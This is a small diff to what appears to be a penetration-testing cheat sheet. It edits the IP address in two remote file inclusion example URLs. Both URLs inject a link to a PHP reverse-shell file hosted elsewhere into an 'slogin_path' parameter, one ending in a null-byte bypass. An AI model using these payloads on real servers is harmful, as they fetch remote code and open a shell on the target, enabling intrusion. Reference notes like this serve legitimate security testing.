@@ -609,8 +609,8 @@ Vulnerable URL/Parameter:
 
 <h4>RFI</h4>
 
-    http://1.1.1.1/index.php?slogin_path=http://10.11.0.105/php-reverse-shell.txt?
-    http://1.1.1.1/index.php?slogin_path=http://10.11.0.105/php-reverse-shell.txt%00
+    http://1.1.1.1/index.php?slogin_path=http://10.10.10.10/php-reverse-shell.txt?
+    http://1.1.1.1/index.php?slogin_path=http://10.10.10.10/php-reverse-shell.txt%00
 
 Other Resources 
 
